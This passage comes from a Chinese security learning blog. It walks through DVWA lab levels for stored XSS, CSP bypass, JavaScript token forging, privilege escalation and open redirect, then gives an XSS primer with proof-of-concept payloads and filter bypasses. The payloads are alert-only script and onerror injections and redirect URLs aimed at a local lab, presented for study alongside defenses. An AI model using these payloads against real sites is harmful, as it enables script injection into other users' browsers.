      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211343718.png" alt="image-20240521134338686"></p>
<p>多了Token验证，防止CSRF攻击   </p>
<p>使用 <code>htmlspecialchars</code> 函数转义输入的值，这样做可以防止XSS，该函数会转换特殊字符（如 <code>&lt;</code>, <code>&gt;</code>, <code>&quot;</code> 等）为 HTML 实体，这样它们在浏览器中就不会被当作代码执行</p>

        <h1 id="十二、XSS（存储型）"   >
          <a href="#十二、XSS（存储型）" class="heading-link"><i class="fas fa-link"></i></a><a href="#十二、XSS（存储型）" class="headerlink" title="十二、XSS（存储型）"></a>十二、XSS（存储型）</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221456806.png" alt="image-20240522145622759"></p>

        <h2 id="Low-11"   >
          <a href="#Low-11" class="heading-link"><i class="fas fa-link"></i></a><a href="#Low-11" class="headerlink" title="Low"></a>Low</h2>
      <p>Name框任意，Message框内输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p>出现弹窗</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221455989.png" alt="image-20240522145524940"></p>
<p>原界面显示已经存入该条信息，所以不清除数据的话，之后每一次打开这个页面都会有弹窗</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221457945.png" alt="image-20240522145754900"></p>
<p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221459285.png" alt="image-20240522145941225"></p>
<p>使用 <code>trim()</code> 函数去除输入字符串的前后空白，只是使用了mysqli_real_escape_string来防止SQL注入，而且可以看到上传成功后就会更新数据库</p>

        <h2 id="Medium-11"   >
          <a href="#Medium-11" class="heading-link"><i class="fas fa-link"></i></a><a href="#Medium-11" class="headerlink" title="Medium"></a>Medium</h2>
      <p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221509004.png" alt="image-20240522150946951"></p>
<p><code>strip_tags()</code> 函数移除Message中字符串中的 HTML 和 PHP 标签</p>
<p><code>htmlspecialchars()</code> 转换Message中特定的字符为 HTML 实体，这可以防止用户输入的数据在 HTML 页面上被解释执行，进一步提高 XSS 防护</p>
<p> <code>str_replace()</code> 过滤Name框中<code>&lt;script&gt;</code> 标签</p>
<p>所以，代码可以插入在Name框中，可以按XSS反射型题的绕过方法，Message框随意</p>
<p>但是尝试之后发现页面的Name框有输入限制，只能用其他工具比如HackBar来传参，用POST传入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">txtName=&lt;Script&gt;alert(/xss/)&lt;/Script&gt;&amp;mtxMessage=122&amp;btnSign=Sigh+Guestbook</span><br></pre></td></tr></table></div></figure>

<p>成功出现弹窗</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241410602.png" alt="image-20240524141056553"></p>

        <h2 id="High-11"   >
          <a href="#High-11" class="heading-link"><i class="fas fa-link"></i></a><a href="#High-11" class="headerlink" title="High"></a>High</h2>
      <p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221523293.png" alt="image-20240522152316234"></p>
<p>和上一题类似的过滤，Name框也过滤了任何形式的 <script>标签，按上一题型的方法换一个标签，用HackBar传入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">txtName=&lt;img src=&quot;x&quot; onerror=&quot;alert(&#x27;XSS&#x27;)&quot;/&gt;&amp;mtxMessage=122&amp;btnSign=Sigh+Guestbook</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241412124.png" alt="image-20240524141202076"></p>

        <h2 id="Impossible-11"   >
          <a href="#Impossible-11" class="heading-link"><i class="fas fa-link"></i></a><a href="#Impossible-11" class="headerlink" title="Impossible"></a>Impossible</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221524697.png" alt="image-20240522152449640"></p>
<p>使用令牌防止CSRF攻击</p>
<p>在Name框也过滤了字符串中的 HTML 和 PHP 标签，转换特定的字符为 HTML 实体，这可以防止用户输入的数据在 HTML 页面上被解释执行，进一步提高 XSS 防护</p>
<p>使用 PDO 预处理语句来插入数据，通过参数绑定来进一步提高安全性</p>

        <h1 id="十三、CSP"   >
          <a href="#十三、CSP" class="heading-link"><i class="fas fa-link"></i></a><a href="#十三、CSP" class="headerlink" title="十三、CSP"></a>十三、CSP</h1>
      
        <h2 id="Low-12"   >
          <a href="#Low-12" class="heading-link"><i class="fas fa-link"></i></a><a href="#Low-12" class="headerlink" title="Low"></a>Low</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221714400.png" alt="image-20240522171405345"></p>
<p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221713230.png" alt="image-20240522171351156"></p>
<p>可以看到被信任的网站有：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://pastebin.com/" >https://pastebin.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> hastebin.com <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.toptal.com/" >www.toptal.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> example.com code.jquery.com <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://ssl.google-analytics.com/" >https://ssl.google-analytics.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://digi.ninja/" >https://digi.ninja</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>试试在框内输入它提示的内容，比如<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://digi.ninja/dvwa/cookie.js%EF%BC%8C%E5%B0%B1%E4%BC%9A%E6%9C%89%E5%BC%B9%E7%AA%97%E6%98%BE%E7%A4%BAcookie" >https://digi.ninja/dvwa/cookie.js，就会有弹窗显示cookie</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221726381.png" alt="image-20240522172655337"></p>
<p>查看网页源代码，也能看到已经插入进去了</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221727414.png" alt="image-20240522172732374"></p>

        <h2 id="Medium-12"   >
          <a href="#Medium-12" class="heading-link"><i class="fas fa-link"></i></a><a href="#Medium-12" class="headerlink" title="Medium"></a>Medium</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221728025.png" alt="image-20240522172809981"></p>
<p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221731556.png" alt="image-20240522173106512"></p>
<p>这行代码设置了 CSP，限制了可以执行的 JavaScript。在允许执行来自同源的脚本（<code>&#39;self&#39;</code>）、内联脚本，以及拥有特定 nonce 的脚本</p>
<p><code>&#39;nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&#39;</code> 是一个 base64 编码的字符串，用于标识某些允许执行的脚本</p>
<p>可以直接输入这个脚本，出现弹窗</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script nonce=&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot;&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405222112926.png" alt="image-20240522211240817"></p>

        <h2 id="High-12"   >
          <a href="#High-12" class="heading-link"><i class="fas fa-link"></i></a><a href="#High-12" class="headerlink" title="High"></a>High</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261116135.png" alt="image-20240526111605040"></p>
<p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261117729.png" alt="image-20240526111702652"></p>
<p>只能引用允许本页面加载的脚本执行</p>
<p>这里还有一个js文件</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261119437.png" alt="image-20240526111950354"></p>
<p>点击按钮后js生成一个script标签(src 指向 source/jsonp.php?callback=solveNum), 并把它加入到 DOM 中</p>
<p>js 中定义了一个 solveNum 的函数，因此 script 标签会把远程加载的 solveSum({“answer”:”15”}) 当作 js 代码执行, 而这个形式正好就是调用了 solveSum 函数, 然后这个函数就会在界面适当的位置写入答案</p>
<p>不是特别明白…</p>

        <h2 id="Impossible-12"   >
          <a href="#Impossible-12" class="heading-link"><i class="fas fa-link"></i></a><a href="#Impossible-12" class="headerlink" title="Impossible"></a>Impossible</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261128991.png" alt="image-20240526112822921"></p>
<p>再查看源代码，主要是impossible.js文件有改变</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261128097.png" alt="image-20240526112858026"></p>
<p>没有了callback参数</p>

        <h1 id="十四、JavaScript"   >
          <a href="#十四、JavaScript" class="heading-link"><i class="fas fa-link"></i></a><a href="#十四、JavaScript" class="headerlink" title="十四、JavaScript"></a>十四、JavaScript</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405222153568.png" alt="image-20240522215322484"></p>

        <h2 id="Low-13"   >
          <a href="#Low-13" class="heading-link"><i class="fas fa-link"></i></a><a href="#Low-13" class="headerlink" title="Low"></a>Low</h2>
      <p>尝试输入success提交，但是显示token不合法</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405222154246.png" alt="image-20240522215454191"></p>
<p>输入success抓包看看</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405222156874.png" alt="image-20240522215642794"></p>
<p>再输入默认值ChangeMe抓包看看</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405222157635.png" alt="image-20240522215732578"></p>
<p>发现token的值并没有发生改变，说明生成token的代码并不是写在服务端的，查看前端的源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405222200703.png" alt="image-20240522220040623"></p>
<p>从页面中的元素（其 ID 为 “phrase”）获取用户输入的值，<code>rot13(phrase)</code>函数是将输入的字符串进行 ROT13 加密，接着，使用 MD5 哈希算法对 ROT13 加密后的字符串进行哈希</p>
<p>下断点，然后点击提交</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405222207601.png" alt="image-20240522220700537"></p>
<p>此时我提交的是success，但是它的phrase依然是ChangeMe，所以需要将它的默认值改成success，这样才能生成success的token</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405222208476.png" alt="image-20240522220849405"></p>
<p>或者是在控制台修改phrase的值</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.getElementById(&quot;phrase&quot;).value=&quot;success&quot;;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405230955703.png" alt="image-20240523095517658"></p>
<p>再输入success进行提交</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405222209278.png" alt="image-20240522220938221"></p>
<p>查看源代码，也主要是写明了token的生成</p>

        <h2 id="Medium-13"   >
          <a href="#Medium-13" class="heading-link"><i class="fas fa-link"></i></a><a href="#Medium-13" class="headerlink" title="Medium"></a>Medium</h2>
      <p>提交之后还是说token不合法</p>
<p>分别输入ChangeMe和success提交并抓包</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405230915098.png" alt="image-20240523091542059"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405230915136.png" alt="image-20240523091554103"></p>
<p>token也是没有变化，看一下它的js代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405230906036.png" alt="image-20240523090644988"></p>
<p><code>do_something(e)</code> 函数接收一个字符串 <code>e</code> 作为参数，并返回这个字符串的反向（即从后到前重新排列的字符串）</p>
<p><code>setTimeout()</code> 是 JavaScript 中用于实现延时执行的函数，这里的延时设置为 300 毫秒后执行 <code>do_elsesomething()</code>，传入字符串 <code>&quot;XX&quot;</code> 作为参数</p>
<p>函数从页面中获取 <code>id</code> 为 <code>&quot;phrase&quot;</code> 的 HTML 元素的值，它将这个值与参数 <code>e</code> 和字符串 <code>&quot;XX&quot;</code> 拼接，使用 <code>do_something()</code> 函数对拼接后的字符串进行反转，最后，将反转后的结果赋值给 <code>id</code> 为 <code>&quot;token&quot;</code> 的元素的 <code>value</code> 属性</p>
<p>所以可以直接在burp里修改token的值</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">token=XXsseccusXX&amp;phrase=success&amp;send=Submit</span><br></pre></td></tr></table></div></figure>

<p>也可以在控制台上修改phrase的值</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.getElementById(&quot;phrase&quot;).value=&quot;success&quot;;</span><br></pre></td></tr></table></div></figure>

<p>发送，提交成功</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405230917698.png" alt="image-20240523091738663"></p>
<p>查看源代码，主要也是这个js文件</p>

        <h2 id="High-13"   >
          <a href="#High-13" class="heading-link"><i class="fas fa-link"></i></a><a href="#High-13" class="headerlink" title="High"></a>High</h2>
      <p>分别提交ChangeMe和success并抓包</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405230927665.png" alt="image-20240523092759627"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405230928215.png" alt="image-20240523092813180"></p>
<p>token也是没有变化的，查看js代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405230928497.png" alt="image-20240523092834450"></p>
<p>有点没看懂，查资料说是被混淆了，那就找一个反混淆的网站：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://deobfuscatejavascript.com/" >http://deobfuscatejavascript.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>然后又发现选中浏览器右侧的 mouse 监听 click 事件，再点击页面的提交，此时浏览器就会自动解码 JS</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405230951922.png" alt="image-20240523095146856"></p>
<p>然后在 token_part_1 下断点：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405230951593.png" alt="image-20240523095103539"></p>
<p><code>do_something(e)</code> 函数接收一个字符串 <code>e</code> 作为参数，并返回这个字符串的逆序</p>
<p><code>token_part_1(a, b)</code> 函数调用 <code>do_something()</code> 函数，并设置 <code>id</code> 为 “token” 的 HTML 元素的 <code>value</code> 为 <code>phrase</code> 元素的值的逆序</p>
<p><code>token_part_2(e = &quot;YY&quot;)</code> 函数使用默认参数 “YY”，将其与 “token” 元素的当前值连接，并使用 SHA-256 算法进行哈希</p>
<p><code>token_part_3(t, y = &quot;ZZ&quot;)</code> 函数类似于 <code>token_part_2</code>，但它允许通过按钮点击事件触发，并将 “token” 元素的值与 “ZZ” 进行连接后进行哈希</p>
<p>关键还是这个phrase，在控制台上修改它的值</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.getElementById(&quot;phrase&quot;).value=&quot;success&quot;;</span><br></pre></td></tr></table></div></figure>

<p>再点击提交即可成功</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405230948877.png" alt="image-20240523094848838"></p>
<p>源代码主要也是这个js文件</p>

        <h2 id="Impossible-13"   >
          <a href="#Impossible-13" class="heading-link"><i class="fas fa-link"></i></a><a href="#Impossible-13" class="headerlink" title="Impossible"></a>Impossible</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405230956126.png" alt="image-20240523095638089"></p>
<p>直接让其没有输入了</p>

        <h1 id="十五、越权"   >
          <a href="#十五、越权" class="heading-link"><i class="fas fa-link"></i></a><a href="#十五、越权" class="headerlink" title="十五、越权"></a>十五、越权</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231005923.png" alt="image-20240523100542855"></p>
<p>由于现在我登录的是admin管理员账号，所以能对这些用户进行操作</p>
<p>但当我登录gordonb账号时就没有这个页面了</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231007763.png" alt="image-20240523100727722"></p>

        <h2 id="Low-14"   >
          <a href="#Low-14" class="heading-link"><i class="fas fa-link"></i></a><a href="#Low-14" class="headerlink" title="Low"></a>Low</h2>
      <p>登录gordonb账号时，当我把之前登录管理员账号时的网页复制粘贴，就能看到现在是gordonb拥有操作权限</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231009624.png" alt="image-20240523100933570"></p>

        <h2 id="Medium、High、Impossible"   >
          <a href="#Medium、High、Impossible" class="heading-link"><i class="fas fa-link"></i></a><a href="#Medium、High、Impossible" class="headerlink" title="Medium、High、Impossible"></a>Medium、High、Impossible</h2>
      <p>按同样的操作粘贴后却显示未授权</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231011368.png" alt="image-20240523101144332"></p>
<p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231013397.png" alt="image-20240523101308357"></p>
<p>都设置了只有当前用户是admin时才能进行访问</p>

        <h1 id="十六、重定向"   >
          <a href="#十六、重定向" class="heading-link"><i class="fas fa-link"></i></a><a href="#十六、重定向" class="headerlink" title="十六、重定向"></a>十六、重定向</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231026658.png" alt="image-20240523102612620"></p>

        <h2 id="Low-15"   >
          <a href="#Low-15" class="heading-link"><i class="fas fa-link"></i></a><a href="#Low-15" class="headerlink" title="Low"></a>Low</h2>
      <p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231026879.png" alt="image-20240523102642842"></p>
<p>这段代码检查 URL 参数 <code>redirect</code> 是否存在且不为空，如果满足条件，则通过 <code>header</code> 函数发送一个 HTTP 重定向到该参数指定的 URL</p>
<p>没有任何过滤，可以直接传参一个网页给redirect</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:4280/vulnerabilities/open_redirect/source/low.php?redirect=https://www.baidu.com/</span><br></pre></td></tr></table></div></figure>

<p>直接就跳转到百度了</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231028188.png" alt="image-20240523102803107"></p>

        <h2 id="Medium-14"   >
          <a href="#Medium-14" class="heading-link"><i class="fas fa-link"></i></a><a href="#Medium-14" class="headerlink" title="Medium"></a>Medium</h2>
      <p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231028988.png" alt="image-20240523102855951"></p>
<p>过滤了http://和https://</p>
<p>使用代理页面：创建一个中间代理页面，用户访问该页面时，该页面再将请求重定向到百度。</p>
<p>创建一个名为 redirect.php 的 PHP 文件。<br>在 redirect.php 文件中添加以下代码：<br><?php
header("Location: http://www.baidu.com");
exit;
?></p>
<p>上传 redirect.php 文件到服务器上，确保它可以被公开访问（例如放置在公共的网站根目录）。</p>
<p>当用户访问 redirect.php 页面时，会被自动重定向到百度的绝对 URL。</p>

        <h2 id="High-14"   >
          <a href="#High-14" class="heading-link"><i class="fas fa-link"></i></a><a href="#High-14" class="headerlink" title="High"></a>High</h2>
      <p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231051923.png" alt="image-20240523105101881"></p>
<p>检查 <code>redirect</code> 参数中是否包含 “info.php” 字符串</p>
<p>可以让任意一个参数的值设置为info.php</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:4280/vulnerabilities/open_redirect/source/low.php?redirect=https://www.baidu.com/?a=info.php</span><br></pre></td></tr></table></div></figure>

<p>重定向到了百度</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231055647.png" alt="image-20240523105532585"></p>

        <h2 id="Impossible-14"   >
          <a href="#Impossible-14" class="heading-link"><i class="fas fa-link"></i></a><a href="#Impossible-14" class="headerlink" title="Impossible"></a>Impossible</h2>
      <p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405231057619.png" alt="image-20240523105737570"></p>
<p>首先检查 <code>redirect</code> 是否存在于 GET 请求中，并且确认它的值是数字</p>
<p><code>intval</code> 函数用于确保 <code>redirect</code> 参数被当作整数处理</p>
<p><code>switch</code> 语句根据 <code>redirect</code> 的整数值选择不同的目标 URL</p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/10/14/XSS%E6%94%BB%E5%87%BB/">XSS攻击</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2023-10-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2024-05-29</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="XSS攻击"   >
          <a href="#XSS攻击" class="heading-link"><i class="fas fa-link"></i></a><a href="#XSS攻击" class="headerlink" title="XSS攻击"></a>XSS攻击</h1>
      
        <h6 id="实践网站：https-xssaq-com-yx"   >
          <a href="#实践网站：https-xssaq-com-yx" class="heading-link"><i class="fas fa-link"></i></a><a href="#实践网站：https-xssaq-com-yx" class="headerlink" title="实践网站：https://xssaq.com/yx/"></a>实践网站：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://xssaq.com/yx/" >https://xssaq.com/yx/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></h6>
      <p>跨站脚本攻击 XSS（Cross Site Scripting Scripting），指攻击者通过在web 页面中写入恶意脚本，进而在用户浏览页面时，控制用户浏览器进行操作的攻击方式。假设在一个服务器上，有一处功能使用了这段代码，他的功能是将用户输入的内容输出到页面上，这就是常见的表现。</p>

        <h4 id="反射型XSS"   >
          <a href="#反射型XSS" class="heading-link"><i class="fas fa-link"></i></a><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h4>
      <p>攻击者通过电子邮件等方式将包含xss代码的恶意链接发送给目标用户。当目标用户访问该链接时，服务器接收该目标用户的请求并进行处理，然后服务器把带有xss代码的数据发送给目标用户的浏览器，浏览器解析这段带有xss代码的恶意脚本后，就会触发xss漏洞。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309241444144.png" alt="image-20230924144421029"></p>

        <h4 id="存储型XSS"   >
          <a href="#存储型XSS" class="heading-link"><i class="fas fa-link"></i></a><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h4>
      <p>攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入帖子的内容中。随着帖子被服务器存储下来，恶意脚本也永久地被存放在服务器的后端存储器中 。 当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本会在他们的浏览器中得到执行 。所以需要浏览器从服务器载入恶意的xss代码，才能真正触发xss。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309241445548.png" alt="image-20230924144550500"></p>

        <h4 id="DOM型XSS"   >
          <a href="#DOM型XSS" class="heading-link"><i class="fas fa-link"></i></a><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h4>
      <p>用户请求一个经过专门设计的URL，它由攻击者提交，而且其中包含XSS代码。服务器的响应不会以任何形式包含攻击者的脚本。 当用户的浏览器处理这个响应时， DOM对象就会处理XSS代码，导致存在XSS漏洞 。</p>

        <h2 id="测试方法"   >
          <a href="#测试方法" class="heading-link"><i class="fas fa-link"></i></a><a href="#测试方法" class="headerlink" title="测试方法"></a>测试方法</h2>
      <p>POC</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt; //弹框，最常用</span><br><span class="line">&lt;script&gt;confirm(&#x27;xss&#x27;)&lt;/script&gt; //弹出确认框</span><br><span class="line">&lt;script&gt;prompt(&#x27;xss&#x27;)&lt;/script&gt; //弹出输入框</span><br></pre></td></tr></table></div></figure>

<p>其他标签如：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt; img src =x onerror =&quot;alert(111)&quot;/&gt;</span><br></pre></td></tr></table></div></figure>

<p>特殊标签 </p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onclick=&#x27;alert(111)&#x27;</span><br><span class="line">javascript:alert(111)</span><br></pre></td></tr></table></div></figure>




        <h2 id="绕过"   >
          <a href="#绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2>
      
        <h4 id="①编码绕过"   >
          <a href="#①编码绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#①编码绕过" class="headerlink" title="①编码绕过"></a>①编码绕过</h4>
      
        <h5 id="js编码"   >
          <a href="#js编码" class="heading-link"><i class="fas fa-link"></i></a><a href="#js编码" class="headerlink" title="js编码"></a>js编码</h5>
      
        <h5 id="html实体编码"   >
          <a href="#html实体编码" class="heading-link"><i class="fas fa-link"></i></a><a href="#html实体编码" class="headerlink" title="html实体编码"></a>html实体编码</h5>
      
        <h5 id="url编码"   >
          <a href="#url编码" class="heading-link"><i class="fas fa-link"></i></a><a href="#url编码" class="headerlink" title="url编码"></a>url编码</h5>
      
        <h5 id="ascii编码"   >
          <a href="#ascii编码" class="heading-link"><i class="fas fa-link"></i></a><a href="#ascii编码" class="headerlink" title="ascii编码"></a>ascii编码</h5>
      
        <h5 id="base64编码"   >
          <a href="#base64编码" class="heading-link"><i class="fas fa-link"></i></a><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h5>
      
        <h5 id="Hex编码"   >
          <a href="#Hex编码" class="heading-link"><i class="fas fa-link"></i></a><a href="#Hex编码" class="headerlink" title="Hex编码"></a>Hex编码</h5>
      
        <h4 id="②其他方式"   >
          <a href="#②其他方式" class="heading-link"><i class="fas fa-link"></i></a><a href="#②其他方式" class="headerlink" title="②其他方式"></a>②其他方式</h4>
      
        <h5 id="过滤空格"   >
          <a href="#过滤空格" class="heading-link"><i class="fas fa-link"></i></a><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h5>
      <p>斜杠代替空格</p>

        <h5 id="过滤单引号、双引号"   >
          <a href="#过滤单引号、双引号" class="heading-link"><i class="fas fa-link"></i></a><a href="#过滤单引号、双引号" class="headerlink" title="过滤单引号、双引号"></a>过滤单引号、双引号</h5>
      <p>可以使用反单引号代替单引号和双引号</p>

        <h5 id="过滤函数"   >
          <a href="#过滤函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#过滤函数" class="headerlink" title="过滤函数"></a>过滤函数</h5>
      <p>可以使用到其他的方法进行javascript远程加载</p>

        <h5 id="过滤括号"   >
          <a href="#过滤括号" class="heading-link"><i class="fas fa-link"></i></a><a href="#过滤括号" class="headerlink" title="过滤括号"></a>过滤括号</h5>
      <p>使用throw 过滤</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;onerror alert;throw 1&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>


        <h2 id="防御"   >
          <a href="#防御" class="heading-link"><i class="fas fa-link"></i></a><a href="#防御" class="headerlink" title="防御"></a>防御</h2>
      
        <h4 id="过滤"   >
          <a href="#过滤" class="heading-link"><i class="fas fa-link"></i></a><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h4>
      <p>过滤输入的字符，以及非法字符例如：&lt; 、&gt; 、* 、”、‘等对输入到页面上的数据进行相应的编码转换，包括html 实体编码，javascript 编码等</p>

        <h4 id="httponly"   >
          <a href="#httponly" class="heading-link"><i class="fas fa-link"></i></a><a href="#httponly" class="headerlink" title="httponly"></a>httponly</h4>
      <p>对cookie 启用httponly</p>

        <h4 id="CSP"   >
          <a href="#CSP" class="heading-link"><i class="fas fa-link"></i></a><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h4>
      <p>启用csp 后，不符合的外部资源就会被禁止加载</p>

        <h4 id="PHP实体化"   >
          <a href="#PHP实体化" class="heading-link"><i class="fas fa-link"></i></a><a href="#PHP实体化" class="headerlink" title="PHP实体化"></a>PHP实体化</h4>
      <p>html specialchars方法可以编码双引号的单引号</p>

